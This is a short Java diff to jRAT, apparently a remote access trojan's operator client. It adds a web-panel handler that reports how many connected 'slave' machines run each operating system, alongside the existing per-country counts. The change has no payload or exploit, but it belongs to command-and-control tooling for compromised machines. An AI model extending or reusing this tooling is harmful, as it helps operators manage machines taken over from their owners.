@@ -11,8 +11,8 @@ import se.jrat.client.Main;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.CountryStatistics.CountryStatEntry;
-
-import com.redpois0n.graphs.graph.GraphEntry;
+import se.jrat.client.settings.OperatingSystemStatistics;
+import se.jrat.client.settings.OperatingSystemStatistics.OperatingSystemStatEntry;
 
 public class WebPanelConnection implements Runnable {
 
@@ -52,7 +52,7 @@ public class WebPanelConnection implements Runnable {
                 			"jRAT " + slave.getVersion(),
                 			slave.getPing() + "",
                 		};
-
+                		
                 		for (String e : data) {
                 			sb.append(e + ":");
                 		}
@@ -77,6 +77,21 @@ public class WebPanelConnection implements Runnable {
             			CountryStatEntry entry = CountryStatistics.getGlobal().getList().get(i);
             			try {            				
             				sb.append(entry.getCountry() + "," + entry.getConnects());
+            				sb.append(";");
+            			} catch (Exception ex) {
+            				ex.printStackTrace();
+            			}
+                	}
+                	
+                	bw.write(sb.toString() + "\n");
+                	bw.flush();
+                } else if (packet == WebPanelPackets.PACKET_LISTOPERATINGSYSTEMS) {
+                	StringBuilder sb = new StringBuilder();
+
+                	for (int i = 0; i < OperatingSystemStatistics.getGlobal().getList().size(); i++) {
+            			OperatingSystemStatEntry entry = OperatingSystemStatistics.getGlobal().getList().get(i);
+            			try {            				
+            				sb.append(entry.getString() + "," + entry.getConnects());
             				sb.append(";");
             			} catch (Exception ex) {
             				ex.printStackTrace();
